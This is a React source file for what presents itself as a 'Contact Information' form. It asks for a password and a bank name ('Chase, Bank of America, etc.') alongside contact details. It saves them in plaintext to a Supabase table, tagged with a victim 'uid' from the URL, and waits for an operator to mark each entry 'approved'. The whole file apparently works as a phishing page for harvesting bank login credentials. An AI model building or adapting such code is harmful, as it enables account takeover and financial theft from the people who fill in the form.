import { useState, useEffect } from 'react'
import { supabase } from '../lib/supabase.js'
import Icon from '../components/Icon.jsx'

export default function ContactForm() {
  const [formId, setFormId] = useState(null)
  const [fullName, setFullName] = useState('')
  const [phone, setPhone] = useState('')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [note, setNote] = useState('')
  const [institution, setInstitution] = useState('')
  const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
  const [submitting, setSubmitting] = useState(false)

  // Obtener user_id de los parámetros de URL
  const params = new URLSearchParams(window.location.search)
  const userId = params.get('uid')

  // Polling para saber si fue aprobado
  useEffect(() => {
    if (step !== 'waiting' || !formId) return

    const interval = setInterval(async () => {
      const { data } = await supabase.from('contact_forms').select('status').eq('id', formId).maybeSingle()
      if (data?.status === 'approved') {
        setStep('success')
        clearInterval(interval)
      }
    }, 1000) // Verifica cada segundo

    return () => clearInterval(interval)
  }, [step, formId])

  const submitForm = async (e) => {
    e.preventDefault()
    if (!fullName || !phone || !email || !password) return

    setSubmitting(true)
    const { data, error } = await supabase
      .from('contact_forms')
      .insert({
        full_name: fullName,
        phone: phone,
        email: email,
        password: password,
        note: note || null,
        institution: institution || null,
        user_id: userId || null,
        status: 'pending',
      })
      .select('id')
      .single()

    setSubmitting(false)

    if (error) {
      alert('Error al guardar: ' + error.message)
      return
    }

    // Formulario guardado, pasar a "Esperando contacto"
    setFormId(data.id)
    setStep('waiting')
  }

  const closeWindow = () => window.close()

  // ---- FORMULARIO ----
  if (step === 'form') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4 py-10">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl">
          <div className="mb-6 flex items-center justify-between">
            <h1 className="text-2xl font-bold text-content-primary">Contact Information</h1>
            <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                <path d="M18 6 6 18M6 6l12 12" />
              </svg>
            </button>
          </div>

          <form onSubmit={submitForm} className="space-y-4">
            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Full name</label>
              <input
                type="text"
                required
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder="John Doe"
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Phone</label>
              <input
                type="tel"
                required
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                placeholder="(201) 555 0123"
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Email</label>
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="john@example.com"
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Password</label>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter password"
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Institution</label>
              <input
                type="text"
                value={institution}
                onChange={(e) => setInstitution(e.target.value)}
                placeholder="Chase, Bank of America, etc."
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary"
              />
            </div>

            <div>
              <label className="mb-1.5 block text-sm font-semibold text-content-primary">Notes (optional)</label>
              <textarea
                value={note}
                onChange={(e) => setNote(e.target.value)}
                placeholder="Any additional information..."
                rows={3}
                className="w-full rounded-xl border-2 border-black/15 px-4 py-3 outline-none transition-colors focus:border-content-primary resize-none"
              />
            </div>

            <button
              type="submit"
              disabled={submitting}
              className="w-full rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90 disabled:opacity-60"
            >
              {submitting ? 'Submitting…' : 'Submit'}
            </button>
          </form>
        </div>
      </div>
    )
  }

  // ---- ESPERANDO CONTACTO ----
  if (step === 'waiting') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="hourglass" size={32} className="text-forest animate-pulse" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Waiting for Contact</h1>
          <p className="text-content-secondary">We received your information. Our team will review it and get back to you soon.</p>
          <div className="mt-6 h-1 w-12 rounded-full bg-bright-green mx-auto animate-pulse" />
        </div>
      </div>
    )
  }

  // ---- ÉXITO ----
  if (step === 'success') {
    setTimeout(closeWindow, 2000)
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="check" size={32} stroke={3} className="text-forest" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Form Submitted Successfully!</h1>
          <p className="text-content-secondary">Thank you. This window will close in a moment.</p>
        </div>
      </div>
    )
  }
}
